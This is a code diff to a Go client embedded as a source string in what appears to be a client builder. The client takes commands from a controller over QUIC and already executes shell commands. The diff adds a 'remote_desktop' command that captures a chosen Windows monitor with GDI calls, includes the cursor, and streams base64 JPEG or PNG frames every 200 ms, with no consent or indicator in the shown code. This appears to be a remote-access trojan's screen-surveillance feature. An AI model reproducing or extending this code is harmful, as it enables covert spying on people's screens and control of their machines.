@@ -47,21 +47,27 @@ import (
     ""crypto/sha1""
     ""crypto/tls""
     ""crypto/x509""
+    ""encoding/base64""
     ""encoding/binary""
     ""encoding/hex""
     ""encoding/json""
     ""errors""
     ""fmt""
+    ""image""
+    ""image/jpeg""
+    ""image/png""
     ""io""
     ""net""
     ""net/http""
     ""os""
     ""os/exec""
     ""os/signal""
+    ""strconv""
     ""strings""
     ""sync""
     ""syscall""
     ""time""
+    ""unsafe""
 
     ""github.com/quic-go/quic-go""
 )
@@ -70,11 +76,13 @@ const (
     channelMain = ""main""
     channelPing = ""ping""
     channelControl = ""control""
+    channelDesktop = ""desktop""
 
     typeHello = ""hello""
     typePingRequest = ""ping_request""
     typePong = ""pong""
     typeCommand = ""command""
+    typeDesktopFrame = ""frame""
 )
 
 const securityMode = ""{mode}""
@@ -100,12 +108,20 @@ type Message struct {{
     PingID        string       `json:""PingId,omitempty""`
     Command       string       `json:""Command,omitempty""`
     ConsoleOutput string       `json:""ConsoleOutput,omitempty""`
+    DesktopFrame  string       `json:""DesktopFrame,omitempty""`
+    DesktopMonitor int         `json:""DesktopMonitor""`
+    DesktopQuality int         `json:""DesktopQuality""`
 }}
 
 type streamWriter struct {{
     mu     sync.Mutex
     stream *quic.SendStream
 }}
+
+var (
+    desktopStreamingCancel context.CancelFunc
+    desktopStreamingMu     sync.Mutex
+)
 
 func (w *streamWriter) Write(msg Message) error {{
     w.mu.Lock()
@@ -465,6 +481,11 @@ func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer
                 continue
             }}
 
+            if strings.HasPrefix(msg.Command, ""remote_desktop:"") {{
+                handleDesktopCommand(ctx, writer, msg.Command)
+                continue
+            }}
+
             switch msg.Command {{
             case ""close_client"":
                 return errCloseClient
@@ -593,6 +614,246 @@ func executeCommand(command string) (string, error) {{
 
     return output, nil
 }}
+
+type RECT struct {{
+    Left, Top, Right, Bottom int32
+}}
+
+type BITMAPINFOHEADER struct {{
+    Size          uint32
+    Width         int32
+    Height        int32
+    Planes        uint16
+    BitCount      uint16
+    Compression   uint32
+    SizeImage     uint32
+    XPelsPerMeter int32
+    YPelsPerMeter int32
+    ClrUsed       uint32
+    ClrImportant  uint32
+}}
+
+type BITMAPINFO struct {{
+    Header BITMAPINFOHEADER
+    Colors [1]uint32
+}}
+
+func handleDesktopCommand(ctx context.Context, writer *streamWriter, command string) {{
+    if command == ""remote_desktop:stop"" {{
+        stopDesktopStreaming()
+        return
+    }}
+
+    if !strings.HasPrefix(command, ""remote_desktop:start:"") {{
+        return
+    }}
+
+    parts := strings.SplitN(command, "":"", 4)
+    if len(parts) < 4 {{
+        return
+    }}
+
+    monitorIndex, err := strconv.Atoi(parts[2])
+    if err != nil {{
+        return
+    }}
+
+    quality, err := strconv.Atoi(parts[3])
+    if err != nil {{
+        return
+    }}
+
+    startDesktopStreaming(ctx, writer, monitorIndex, quality)
+}}
+
+func startDesktopStreaming(ctx context.Context, writer *streamWriter, monitorIndex, quality int) {{
+    stopDesktopStreaming()
+
+    ctx, cancel := context.WithCancel(ctx)
+    desktopStreamingMu.Lock()
+    desktopStreamingCancel = cancel
+    desktopStreamingMu.Unlock()
+
+    go func() {{
+        ticker := time.NewTicker(200 * time.Millisecond)
+        defer ticker.Stop()
+
+        for {{
+            select {{
+            case <-ctx.Done():
+                return
+            case <-ticker.C:
+                frame, err := captureDesktopFrame(monitorIndex, quality)
+                if err != nil {{
+                    continue
+                }}
+
+                msg := Message{{
+                    Channel:       channelDesktop,
+                    Type:          typeDesktopFrame,
+                    DesktopMonitor: monitorIndex,
+                    DesktopQuality: quality,
+                    DesktopFrame:   frame,
+                }}
+
+                if err := writer.Write(msg); err != nil {{
+                    return
+                }}
+            }}
+        }}
+    }}()
+}}
+
+func stopDesktopStreaming() {{
+    desktopStreamingMu.Lock()
+    defer desktopStreamingMu.Unlock()
+
+    if desktopStreamingCancel != nil {{
+        desktopStreamingCancel()
+        desktopStreamingCancel = nil
+    }}
+}}
+
+func getMonitorRect(index int) (*RECT, error) {{
+    user32 := syscall.NewLazyDLL(""user32.dll"")
+    enumDisplayMonitors := user32.NewProc(""EnumDisplayMonitors"")
+
+    var monitors []RECT
+    enumProc := syscall.NewCallback(func(hMonitor, hdcMonitor uintptr, prc *RECT, dwData uintptr) uintptr {{
+        if prc != nil {{
+            monitors = append(monitors, *prc)
+        }}
+        return 1
+    }})
+    ret, _, _ := enumDisplayMonitors.Call(0, 0, enumProc, 0)
+    _ = ret
+
+    if index < 0 || index >= len(monitors) {{
+        return nil, fmt.Errorf(""monitor index %d out of range (have %d)"", index, len(monitors))
+    }}
+
+    return &monitors[index], nil
+}}
+
+type CURSORINFO struct {{
+    CbSize      uint32
+    Flags       uint32
+    HCursor     uintptr
+    PtScreenPos POINT
+}}
+
+type POINT struct {{
+    X, Y int32
+}}
+
+func captureDesktopFrame(monitorIndex, quality int) (string, error) {{
+    rect, err := getMonitorRect(monitorIndex)
+    if err != nil {{
+        return """", err
+    }}
+
+    width := int(rect.Right - rect.Left)
+    height := int(rect.Bottom - rect.Top)
+    if width <= 0 || height <= 0 {{
+        return """", fmt.Errorf(""invalid monitor dimensions"")
+    }}
+
+    user32 := syscall.NewLazyDLL(""user32.dll"")
+    gdi32 := syscall.NewLazyDLL(""gdi32.dll"")
+
+    getDC := user32.NewProc(""GetDC"")
+    releaseDC := user32.NewProc(""ReleaseDC"")
+    createCompatibleDC := gdi32.NewProc(""CreateCompatibleDC"")
+    deleteDC := gdi32.NewProc(""DeleteDC"")
+    createCompatibleBitmap := gdi32.NewProc(""CreateCompatibleBitmap"")
+    selectObject := gdi32.NewProc(""SelectObject"")
+    deleteObject := gdi32.NewProc(""DeleteObject"")
+    bitBlt := gdi32.NewProc(""BitBlt"")
+    getDIBits := gdi32.NewProc(""GetDIBits"")
+    getCursorInfo := user32.NewProc(""GetCursorInfo"")
+    drawIconEx := user32.NewProc(""DrawIconEx"")
+
+    ci := CURSORINFO{{CbSize: uint32(unsafe.Sizeof(CURSORINFO{{}}))}}
+    getCursorInfo.Call(uintptr(unsafe.Pointer(&ci)))
+
+    hdcScreen, _, _ := getDC.Call(0)
+    if hdcScreen == 0 {{
+        return """", fmt.Errorf(""GetDC failed"")
+    }}
+    defer releaseDC.Call(0, hdcScreen)
+
+    hdcMem, _, _ := createCompatibleDC.Call(hdcScreen)
+    if hdcMem == 0 {{
+        return """", fmt.Errorf(""CreateCompatibleDC failed"")
+    }}
+    defer deleteDC.Call(hdcMem)
+
+    hBitmap, _, _ := createCompatibleBitmap.Call(hdcScreen, uintptr(width), uintptr(height))
+    if hBitmap == 0 {{
+        return """", fmt.Errorf(""CreateCompatibleBitmap failed"")
+    }}
+    defer deleteObject.Call(hBitmap)
+
+    selectObject.Call(hdcMem, hBitmap)
+
+    const SRCCOPY = 0x00CC0020
+    const CAPTUREBLT = 0x40000000
+    ret, _, _ := bitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height),
+        hdcScreen, uintptr(rect.Left), uintptr(rect.Top), SRCCOPY|CAPTUREBLT)
+    if ret == 0 {{
+        return """", fmt.Errorf(""BitBlt failed"")
+    }}
+
+    const CURSOR_SHOWING = 1
+    if ci.Flags&CURSOR_SHOWING != 0 && ci.HCursor != 0 {{
+        const DI_NORMAL = 3
+        drawIconEx.Call(hdcMem,
+            uintptr(ci.PtScreenPos.X-rect.Left),
+            uintptr(ci.PtScreenPos.Y-rect.Top),
+            ci.HCursor, 0, 0, 0, 0, DI_NORMAL)
+    }}
+
+    var bmi BITMAPINFO
+    bmi.Header.Size = uint32(unsafe.Sizeof(bmi.Header))
+    bmi.Header.Width = int32(width)
+    bmi.Header.Height = -int32(height)
+    bmi.Header.Planes = 1
+    bmi.Header.BitCount = 32
+    bmi.Header.Compression = 0
+
+    stride := (width*32 + 31) / 32 * 4
+    pixelData := make([]byte, stride*height)
+
+    getDIBits.Call(hdcMem, hBitmap, 0, uintptr(height),
+        uintptr(unsafe.Pointer(&pixelData[0])),
+        uintptr(unsafe.Pointer(&bmi)),
+        0)
+
+    img := image.NewRGBA(image.Rect(0, 0, width, height))
+    for y := 0; y < height; y++ {{
+        for x := 0; x < width; x++ {{
+            srcIdx := y*stride + x*4
+            dstIdx := y*img.Stride + x*4
+            img.Pix[dstIdx+0] = pixelData[srcIdx+2]
+            img.Pix[dstIdx+1] = pixelData[srcIdx+1]
+            img.Pix[dstIdx+2] = pixelData[srcIdx+0]
+            img.Pix[dstIdx+3] = 255
+        }}
+    }}
+
+    var buf bytes.Buffer
+    if quality >= 90 {{
+        err = png.Encode(&buf, img)
+    }} else {{
+        err = jpeg.Encode(&buf, img, &jpeg.Options{{Quality: quality}})
+    }}
+    if err != nil {{
+        return """", fmt.Errorf(""encode failed: %w"", err)
+    }}
+
+    return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
+}}
+
 ";
             return src;
         }
